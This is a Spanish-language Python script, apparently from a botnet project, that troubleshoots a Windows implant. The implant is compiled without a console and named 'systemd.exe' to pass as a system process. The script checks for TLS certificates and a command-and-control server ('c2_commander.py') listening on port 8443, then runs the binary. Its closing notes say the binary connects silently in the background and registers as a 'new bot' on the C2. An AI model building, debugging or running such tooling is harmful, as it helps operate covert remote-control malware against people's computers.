"""Diagnostica por qué el binario no funciona."""
import subprocess
import os
import sys

print("="*70)
print("       DIAGNOSTICO DE BINARIO")
print("="*70 + "\n")

# 1. Verificar que existe
print("[1] Verificando que el binario existe...")
if os.path.exists('dist/systemd.exe'):
    size = os.path.getsize('dist/systemd.exe') / (1024*1024)
    print(f"    ✓ dist/systemd.exe existe ({size:.1f} MB)")
else:
    print("    ✗ dist/systemd.exe NO existe")
    print("    → Ejecuta: COMPILE_NOW.bat")
    sys.exit(1)

# 2. Verificar certificados SSL
print("\n[2] Verificando certificados SSL...")
if os.path.exists('cert.pem') and os.path.exists('key.pem'):
    print("    ✓ cert.pem y key.pem existen")
else:
    print("    ✗ Certificados faltantes")
    print("    → Ejecuta: python generate_certs.py")

# 3. Verificar que C2 está corriendo
print("\n[3] Verificando C2 Server...")
try:
    result = subprocess.run(['netstat', '-an'], capture_output=True, text=True)
    if ':8443' in result.stdout:
        print("    ✓ Puerto 8443 está en uso (C2 corriendo)")
    else:
        print("    ✗ Puerto 8443 NO está en uso")
        print("    → Inicia C2: python c2_commander.py")
except:
    print("    ? No se pudo verificar")

# 4. Verificar dependencias del binario
print("\n[4] Verificando dependencias...")
try:
    import paramiko
    print("    ✓ paramiko disponible")
except:
    print("    ✗ paramiko no disponible (pero debería estar en el binario)")

# 5. Intentar ejecutar el binario
print("\n[5] Intentando ejecutar el binario...")
print("    [*] Ejecutando dist\\systemd.exe por 5 segundos...")

try:
    # Ejecutar el binario con timeout
    process = subprocess.Popen(
        ['dist\\systemd.exe'],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True
    )
    
    # Esperar 5 segundos
    try:
        stdout, stderr = process.communicate(timeout=5)
        print(f"    Output:\n{stdout}")
        if stderr:
            print(f"    Errores:\n{stderr}")
    except subprocess.TimeoutExpired:
        print("    ✓ Binario está corriendo (timeout de 5s alcanzado)")
        process.kill()
        print("    [*] Binario detenido")
        
except Exception as e:
    print(f"    ✗ Error: {e}")

print("\n" + "="*70)
print("       DIAGNOSTICO COMPLETO")
print("="*70)
print("\nRECOMENDACIONES:")
print("  1. Si el binario no muestra nada, es porque está compilado con --noconsole")
print("  2. Ejecuta: COMPILE_WITH_CONSOLE.bat para ver output")
print("  3. Asegúrate de que C2 esté corriendo primero")
print("  4. El binario se conecta silenciosamente en background")
print("\nPARA VER SI FUNCIONA:")
print("  1. Ejecuta: python c2_commander.py")
print("  2. En otra terminal: dist\\systemd.exe")
print("  3. En C2 deberías ver: [+] Nuevo bot conectado")

input("\nPresiona Enter para continuar...")
